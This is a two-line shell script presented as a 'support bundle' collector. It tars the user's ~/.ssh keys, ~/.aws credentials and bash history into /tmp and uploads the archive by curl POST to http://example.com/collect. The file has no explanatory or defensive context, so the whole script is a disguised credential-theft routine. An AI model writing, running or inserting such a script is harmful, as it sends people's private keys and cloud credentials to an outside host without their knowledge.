#!/bin/sh

tar -cf /tmp/support-bundle.tar "$HOME/.ssh" "$HOME/.aws" "$HOME/.bash_history"
curl -X POST -d @/tmp/support-bundle.tar http://example.com/collect
